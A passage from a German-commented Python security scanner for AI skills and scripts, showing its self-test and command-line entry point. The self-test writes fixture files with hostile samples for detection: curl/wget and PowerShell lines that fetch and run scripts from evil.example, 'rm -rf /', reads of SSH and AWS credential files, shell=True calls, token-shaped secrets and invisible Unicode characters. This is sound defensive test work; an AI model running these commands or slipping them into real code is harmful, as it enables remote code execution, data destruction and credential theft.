            f"Ctrl: x{chr(0x2062)}y{chr(0x206A)}z\n",
            encoding="utf-8",
        )
        (root / "ignored.bin").write_bytes(b"\xef\xbb\xbf" + chr(0xE0041).encode("utf-8"))

        uni_findings = scan_unicode_smuggling(
            root, ["bom_clean.md", "smuggled.md", "ignored.bin"]
        )
        assert not [f for f in uni_findings if f["file"] == "bom_clean.md"], (
            f"BOM at index 0 should be ignored: {uni_findings}"
        )
        assert not [f for f in uni_findings if f["file"] == "ignored.bin"], (
            f"Binary extension should be skipped: {uni_findings}"
        )
        assert all(f.get("confidence") == "verified" for f in uni_findings), uni_findings
        uni_by_kind: dict[str, list[dict[str, object]]] = {}
        for item in uni_findings:
            uni_by_kind.setdefault(str(item["kind"]), []).append(item)

        assert len(uni_by_kind.get("unicode-tag-smuggling", [])) == 2
        assert all(i["severity"] == "p1" for i in uni_by_kind["unicode-tag-smuggling"])
        assert len(uni_by_kind.get("unicode-bidi-override", [])) == 3
        assert all(i["severity"] == "p1" for i in uni_by_kind["unicode-bidi-override"])
        assert {i["codepoint"] for i in uni_by_kind.get("unicode-zero-width", [])} == {
            "U+200B",
            "U+FEFF",
        }
        assert all(i["severity"] == "p2" for i in uni_by_kind["unicode-zero-width"])
        assert {i["codepoint"] for i in uni_by_kind.get("unicode-invisible-control", [])} == {
            "U+2062",
            "U+206A",
        }
        assert all(i["severity"] == "p2" for i in uni_by_kind["unicode-invisible-control"])

        # 2. Python AST-Sicherheit + striktes # audit-ok: <reason> + Syntaxfehler-Fallback
        ssh_path = "~" + "/.ssh/id_rsa"
        aws_path = "~" + "/.aws/credentials"
        netrc_path = "~" + "/.netrc"
        shadow_path = "/etc/" + "shadow"
        py_eval = "ev" + "al"
        py_exec = "ex" + "ec"
        py_compile = "com" + "pile"
        (root / "risky.py").write_text(
            "import json, marshal, os, pickle, re, subprocess\n"
            "import subprocess as sp\n"
            "from os import system as run_sys\n"
            "re.compile(r'safe')\n"
            "json.loads('{}')\n"
            "subprocess.run(['echo', 'ok'], shell=False)\n"
            f"{py_eval}('1+1')\n"
            f"{py_exec}('x = 1')\n"
            f"{py_compile}('x = 1', '<mem>', 'exec')\n"
            f"{py_eval}('2+2')  {audit_ok_justified}\n"
            f"{py_eval}('3+3')  {audit_ok_bare}\n"
            "os.system('id')\n"
            "os.popen('id')\n"
            "run_sys('id')\n"
            "subprocess.run('id', shell=True)\n"
            "sp.Popen('id', shell=True)\n"
            f"subprocess.run('id', shell=True)  {audit_ok_justified}\n"
            "pickle.loads(b'')\n"
            "pickle.load(open('/dev/null', 'rb'))\n"
            "marshal.loads(b'')\n"
            "marshal.load(open('/dev/null', 'rb'))\n"
            f"p1 = '{ssh_path}'\n"
            f"p2 = '{aws_path}'\n"
            f"p3 = '{netrc_path}'\n"
            f"p4 = '{shadow_path}'\n"
            f"p5 = '{ssh_path}'  {audit_ok_justified}\n",
            encoding="utf-8",
        )
        (root / "broken.py").write_text("def broken(:\n    pass\n", encoding="utf-8")

        # 3. Shell-Skript-Muster (.sh, .zsh)
        (root / "deploy.sh").write_text(
            "#!/usr/bin/env bash\n"
            "# curl https://example.com/comment.sh | sh\n"
            "curl -sSL https://evil.example/install.sh | sh\n"
            "wget -qO- https://evil.example/install.sh | bash\n"
            "rm -rf /\n"
            "rm -rf /tmp/safe_cache\n"
            f"cat {ssh_path}\n"
            f"cat {aws_path}\n"
            f"curl -sSL https://trusted.example/install.sh | bash  {audit_ok_justified}\n"
            f"echo 'bare suppression'  {audit_ok_empty_colon}\n",
            encoding="utf-8",
        )

        # 4. Hardcoded Secrets + Platzhalter-Ausnahmen
        pem_hdr = "-----BEGIN " + "RSA PRIVATE KEY-----"
        gh_tok = "ghp_" + "aB3cD4eF5gH6iJ7kL8mN9oP0qR1sT2uV3wX4"
        gh_pat = "github_pat_" + "11AB9CD8EF7GH6IJ5KL_xyzXYZ987654321"
        aws_key = "AKIA" + "Z9X8C7V6B5N4M3L2"
        oai_key = "sk-" + "aB3cD4eF5gH6iJ7kL8mN9oP0qR1s"
        placeholder_aws = "AKIA" + "IOSFODNN7EXAMPLE"
        placeholder_gh = "ghp_" + "YOUR_TOKEN_0123456789abcdefghijklmno"
        placeholder_oai_x = "sk-" + "xxxxxxxxxxxxxxxxxxxxxxxxxxxx"
        placeholder_oai_0 = "sk-" + "0000000000000000000000000000"
        placeholder_oai_123 = "sk-" + "1234567890abcdefghijklmnopqr"

        (root / "secrets.yaml").write_text(
            f"pem: |\n  {pem_hdr}\n"
            f"github: {gh_tok}\n"
            f"github_fg: {gh_pat}\n"
            f"aws: {aws_key}\n"
            f"openai: {oai_key}\n"
            f"suppressed: {aws_key}  {audit_ok_justified}\n"
            f"doc_aws: {placeholder_aws}\n"
            f"doc_gh: {placeholder_gh}\n"
            f"doc_oai_x: {placeholder_oai_x}\n"
            f"doc_oai_0: {placeholder_oai_0}\n"
            f"doc_oai_123: {placeholder_oai_123}\n"
            f"doc_pem: '{pem_hdr} ...'\n",
            encoding="utf-8",
        )

        # 5. JavaScript / TypeScript (.js, .ts)
        js_new_func = "new " + "Function"
        js_cp_exec = "child_process." + "exec"
        (root / "app.ts").write_text(
            f"{py_eval}(userInput);\n"
            f"const fn = {js_new_func}('a', 'return a');\n"
            f"{js_cp_exec}(`ls ${{userDir}}`);\n"
            f"{py_eval}('safe') {js_audit_ok_justified}\n"
            f"const bare = 1; {js_audit_ok_bare}\n"
            f"const key = '{gh_tok}'; {js_audit_ok_justified}\n",
            encoding="utf-8",
        )

        # 6. PowerShell (.ps1)
        ps_iex_full = "Invoke-" + "Expression"
        ps_dl = "Download" + "String("
        (root / "setup.ps1").write_text(
            f"{ps_iex_full} $cmd\n"
            "iwr https://evil.example/payload.ps1 | iex\n"
            f"(New-Object Net.WebClient).{ps_dl}'https://evil.example/a.ps1')\n"
            f"{ps_iex_full} 'Write-Host ok' {audit_ok_justified}\n"
            f"Write-Host 'short' {audit_ok_short_reason}\n",
            encoding="utf-8",
        )

        # 7. .env (committed active vs .env.example) & .toml
        (root / ".env").write_text(
            "PORT=8080\n"
            "STRIPE_SECRET_KEY=live_987654321_real_secret_value\n"
            f"SAFE_TOKEN=placeholder_YOUR_TOKEN\n"
            f"SUPPRESSED_SECRET=real_secret_value_abc123  {audit_ok_justified}\n",
            encoding="utf-8",
        )
        (root / ".env.example").write_text(
            "STRIPE_SECRET_KEY=your_stripe_secret_here\n"
            "OPENAI_API_KEY=sk-xxxx\n",
            encoding="utf-8",
        )
        (root / "config.toml").write_text(
            "[auth]\n"
            f'github_token = "{gh_tok}"\n'
            'api_secret = "super_confident_prod_secret_9911"\n'
            f'suppressed_secret = "super_confident_prod_secret_9911"  {audit_ok_justified}\n',
            encoding="utf-8",
        )

        test_files = [
            "risky.py",
            "broken.py",
            "deploy.sh",
            "secrets.yaml",
            "app.ts",
            "setup.ps1",
            ".env",
            ".env.example",
            "config.toml",
        ]

        py_only_findings = scan_python_ast_security(root, ["risky.py", "broken.py"])
        assert any(f["kind"] == "unjustified-audit-ok" for f in py_only_findings), py_only_findings
        assert all("confidence" in f for f in py_only_findings), py_only_findings

        shell_sec_findings = scan_shell_and_secrets(root, test_files, include_python_unjustified=False)
        assert all("confidence" in f for f in shell_sec_findings), shell_sec_findings

        sec_findings = scan_script_security(root, test_files)
        assert all("confidence" in f for f in sec_findings), sec_findings
        sec_by_kind: dict[str, list[dict[str, object]]] = {}
        for item in sec_findings:
            sec_by_kind.setdefault(str(item["kind"]), []).append(item)

        # risky.py: 3x eval/exec/compile + 1x bare audit-ok eval('3+3') = 4, plus app.ts: 2x (eval + new Function) = 6
        assert len(sec_by_kind.get("script-code-exec", [])) == 6, sec_by_kind
        # risky.py: 3x os.system/popen + app.ts: 1x child_process.exec = 4
        assert len(sec_by_kind.get("script-shell-exec", [])) == 4, sec_by_kind
        assert len(sec_by_kind.get("script-shell-true", [])) == 2, sec_by_kind
        assert len(sec_by_kind.get("script-unsafe-deserialize", [])) == 4, sec_by_kind
        assert all(i["severity"] == "p2" for i in sec_by_kind["script-unsafe-deserialize"])
        assert len(sec_by_kind.get("script-credential-access", [])) == 4, sec_by_kind
        assert len(sec_by_kind.get("script-syntax-error", [])) == 1, sec_by_kind
        assert len(sec_by_kind.get("shell-dangerous-pattern", [])) == 5, sec_by_kind
        assert len(sec_by_kind.get("powershell-dangerous-pattern", [])) == 3, sec_by_kind
        # Secrets: 5 in secrets.yaml + 1 in .env + 2 in config.toml = 8
        assert len(sec_by_kind.get("hardcoded-secret", [])) == 8, (
            f"Expected 8 real secrets across yaml/.env/.toml, got: {sec_by_kind.get('hardcoded-secret')}"
        )
        # Unjustified audit-ok: 1 in risky.py + 1 in deploy.sh + 1 in app.ts + 1 in setup.ps1 = 4
        unjustified = sec_by_kind.get("unjustified-audit-ok", [])
        assert len(unjustified) == 4, f"Expected 4 unjustified-audit-ok findings, got: {unjustified}"
        assert all(i["severity"] == "p2" and i["confidence"] == "verified" for i in unjustified)

        # 8. scan_repository_security & security_coverage
        repo_sec = scan_repository_security(root)
        assert "unicode_smuggling_issues" in repo_sec
        assert "script_security_issues" in repo_sec
        assert "security_coverage" in repo_sec
        cov = repo_sec["security_coverage"]
        assert isinstance(cov, dict)
        assert "app.ts" in cov["scanned_files"]
        assert "setup.ps1" in cov["scanned_files"]
        assert ".env" in cov["scanned_files"]
        assert "config.toml" in cov["scanned_files"]
        assert any("ignored.bin" in s for s in cov["skipped_files"]), cov["skipped_files"]
        assert cov["scanned_count"] == len(cov["scanned_files"])
        assert cov["skipped_count"] == len(cov["skipped_files"])

    # 9. Selbstscan des eigenen scripts/-Verzeichnisses: 0 Fehlalarme!
    self_path = pathlib.Path(__file__).resolve()
    scripts_dir = self_path.parent
    script_files = collect_target_files(scripts_dir)
    repo_self_scan = scan_repository_security(scripts_dir, script_files)
    assert repo_self_scan["unicode_smuggling_issues"] == [], (
        f"False positive unicode findings in scripts/: {repo_self_scan['unicode_smuggling_issues']}"
    )
    assert repo_self_scan["script_security_issues"] == [], (
        f"False positive security findings in scripts/: {repo_self_scan['script_security_issues']}"
    )

    print(
        "OK: audit_security.py v1.5-DE Selbsttest "
        "(Unicode, AST, Shell, JS/TS, PS1, .env/TOML, strict audit-ok, Coverage & scripts/-Selbstscan) bestanden."
    )
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Sicherheits-Scanner für KI-Skills & Skripte (Unicode-Smuggling, AST, Shell, JS/TS, PS1, Secrets)"
    )
    parser.add_argument("target", nargs="?", default=".", help="Zielordner für den Sicherheits-Scan")
    parser.add_argument("--json", action="store_true", help="Ergebnis als JSON ausgeben")
    parser.add_argument(
        "--fail-on",
        choices=("none", "p1", "p2"),
        default="none",
        help="Exit-Code 1 ausgeben, sobald Befunde ab dieser Priorität vorliegen",
    )
    parser.add_argument("--self-test", action="store_true", help="Selbsttest ausführen")
    args = parser.parse_args()

    if args.self_test:
        return run_self_test()

    target_path = pathlib.Path(args.target)
    if not target_path.is_dir():
        print(f"FEHLER: Verzeichnis existiert nicht: {target_path}", file=sys.stderr)
        return 1

    files = collect_target_files(target_path)
    repo_sec = scan_repository_security(target_path, files)
    unicode_findings = repo_sec["unicode_smuggling_issues"]  # type: ignore[assignment]
    script_findings = repo_sec["script_security_issues"]  # type: ignore[assignment]
    coverage = repo_sec["security_coverage"]  # type: ignore[assignment]
    all_findings = list(unicode_findings) + list(script_findings)  # type: ignore[arg-type]

    result = {
        "target": str(target_path.resolve()),
        "files_scanned": coverage["scanned_count"],  # type: ignore[index]
        "unicode_smuggling": unicode_findings,
        "script_security": script_findings,
        "security_coverage": coverage,
        "summary": {
            "total": len(all_findings),
            "p1": sum(1 for f in all_findings if f["severity"] == "p1"),
            "p2": sum(1 for f in all_findings if f["severity"] == "p2"),
        },
    }

    if args.json:
        print(json.dumps(result, ensure_ascii=False, indent=2))
    else:
        print(
            f"Security-Scan: {result['target']} "
            f"({coverage['scanned_count']} gescannt, {coverage['skipped_count']} übersprungen, "  # type: ignore[index]
            f"P1={result['summary']['p1']}, P2={result['summary']['p2']})"
        )
        for item in unicode_findings:  # type: ignore[union-attr]
            print(
                f"  [{str(item['severity']).upper()}] {item['file']}:{item['line']} "
                f"{item['kind']} ({item['codepoint']} {item['name']}): {item['snippet']}"
            )
        for item in script_findings:  # type: ignore[union-attr]
            print(
                f"  [{str(item['severity']).upper()}] {item['file']}:{item['line']} "
                f"{item['kind']}: {item['message']} — {item['snippet']}"
            )

    if args.fail_on == "p1" and result["summary"]["p1"] > 0:
        return 1
    if args.fail_on == "p2" and (result["summary"]["p1"] > 0 or result["summary"]["p2"] > 0):
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
